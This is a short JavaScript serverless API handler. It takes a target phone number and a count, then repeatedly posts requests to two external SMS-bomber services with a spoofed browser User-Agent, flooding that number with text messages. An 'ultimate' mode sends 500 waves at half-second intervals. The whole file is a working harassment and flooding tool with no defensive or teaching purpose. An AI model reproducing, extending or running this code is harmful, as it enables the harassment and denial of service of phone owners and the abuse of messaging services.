export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  const targetLinks = [
    'https://shadowx-sms-bomber.onrender.com/',
    'https://nuke-sms-bomber.pages.dev/'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 500 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      const attackPromises = targetLinks.map(link => 
        fetch(link, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
          },
          body: JSON.stringify({ number, amount: 1, country: "BD" }),
        }).catch(err => console.log("Error:", err.message))
      );

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED!" : "ATTACK IN PROGRESS!" 
  });
                 }
